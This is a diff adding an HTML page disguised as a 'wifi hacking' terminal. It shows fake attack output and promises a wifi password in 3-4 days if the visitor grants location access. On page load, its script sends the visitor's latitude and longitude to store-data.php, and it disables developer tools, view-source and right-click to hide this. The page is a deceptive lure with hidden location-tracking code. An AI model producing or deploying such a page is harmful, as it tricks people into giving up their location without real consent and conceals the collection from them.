@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>⚠ Wifi Hacking ⚠</title>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Mono&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      background-color: #000;
+      color: #33ff33;
+      font-family: 'Fira Mono', monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .terminal {
+      width: 90%;
+      max-width: 1000px;
+      background: #000;
+      border: 1px solid #333;
+      padding: 20px;
+      box-shadow: 0 0 10px #000;
+      overflow-y: auto;
+      height: 58vh;
+    }
+
+    .command::before {
+      content: "wifi@hack:~# ";
+      color: #00ff00;
+    }
+
+    .command-output {
+      margin-left: 2ch;
+      color: #aaa;
+    }
+
+    .prompt {
+      margin-top: 0px;
+      color: #0f0;
+    }
+
+    button {
+      margin-top: 20px;
+      padding: 10px 25px;
+      background: #000;
+      color: #0f0;
+      border: 1px solid #0f0;
+      font-family: 'Fira Mono', monospace;
+      font-size: 1em;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    button:hover {
+      background: #0f0;
+      color: #000;
+    }
+
+    .blink {
+      display: inline-block;
+      width: 10px;
+      background-color: #33ff33;
+      animation: blink 1s steps(2, start) infinite;
+      vertical-align: middle;
+    }
+
+    @keyframes blink {
+      0%, 100% {
+        opacity: 0;
+      }
+      50% {
+        opacity: 1;
+      }
+    }
+    
+    html, body {
+  height: 100%;
+  overflow: hidden;
+}
+
+  </style>
+</head>
+<body onload="getLocation()">
+  <div class="terminal">
+    <div class="command">echo "Initiating Wifi Exploit..."</div>
+    <div class="command-output">[+] Scanning for targets...</div>
+    <div class="command-output">[+] Found target: ******** (**:**:**:**:**:**)</div>
+    <div class="command-output">[+] Attempting deauthentication attack...</div>
+    <div class="command-output">[+] Sending packets... 5 packets sent successfully</div>
+    <div class="command-output">[+] Exploit engaged.</div>
+
+    <div class="command">echo "Simulated hacking in progress..."</div>
+    <div class="command-output">⚠ This is a wifi hacking website make by a hacker. This website scans the networks and provides the password aftering 3-4 days.</div>
+    <div class="command-output">= Please allow access of the location to the website.</div>
+    <div class="command-output">= You should have patience for 3-4 days.</div>
+    <div class="command-output">= Look back our website after the given peroid of time.</div>
+    <div class="command-output">= Click the button 6 times to connect to the wifi.</div>
+
+    <div class="prompt">
+      Engage Protocol? <button onclick="simulateHack()">[Y]es</button>
+      <p id="demo"></p>
+    </div>
+
+    <div id="output" class="command-output"></div>
+
+    <div class="command"><span class="blink">&nbsp;</span></div>
+  </div>
+  
+  <div class="terminal" style="height: 28vh;">
+  	<br>
+<div class="command">show about-hack.txt</div>
+<div class="command-output"># About Hack</div>
+<div class="command-output">This is a website made by a hacker named unknown.</div>
+<div class="command-output">The goal of creating this website is to ensure that everyone have wifi whether you'r not at the place where the wifi is used to be placed.</div>
+<div class="command-output">We have to give you some of the precautions as if you tell anyone about this website or if this website comes in a wrong hand then the person can change the password of the wifi just by using this website so be carefull.</div>
+<div class="command-output">- Thank you
+  </div>
+</div>
+  <script>
+    let clickCount = 0;
+    const output = document.getElementById('output');
+
+    function simulateHack() {
+      clickCount++;
+      const messages = [
+        "[*] Running handshake capture...",
+        "[*] Capturing packets...",
+        "[+] Handshake saved to capture.cap",
+        "[+] Simulated data analysis in progress...",
+        "[+] Simulation complete."
+      ];
+      if (clickCount <= messages.length) {
+        const line = document.createElement("div");
+        line.textContent = messages[clickCount - 1];
+        output.appendChild(line);
+        output.scrollTop = output.scrollHeight;
+      } else {
+        const done = document.createElement("div");
+        done.textContent = "[✓] Protocol fully engaged. All systems nominal.";
+        output.appendChild(done);
+        output.scrollTop = output.scrollHeight;
+      }
+    }
+
+ document.addEventListener('keydown', function (e) {
+    if (
+      e.key === 'F12' ||                         // DevTools
+      (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) || // Ctrl+Shift+I/J/C
+      (e.ctrlKey && e.key === 'U')              // View source
+    ) {
+      e.preventDefault();
+      return false;
+    }
+  });
+
+  // Disable right-click
+  document.addEventListener('contextmenu', e => e.preventDefault());
+  
+  
+  
+  
+  
+  const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(success, error);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function success(position) {
+  const xhttp = new XMLHttpRequest();
+  xhttp.open("GET", "store-data.php?lat=" + 		   position.coords.latitude + "&long=" + position.coords.longitude);
+  xhttp.send();
+}
+
+function error() {
+  alert("Sorry, no position available.");
+}
+  
+  
+  
+  
+  </script>
+</body>
+</html>
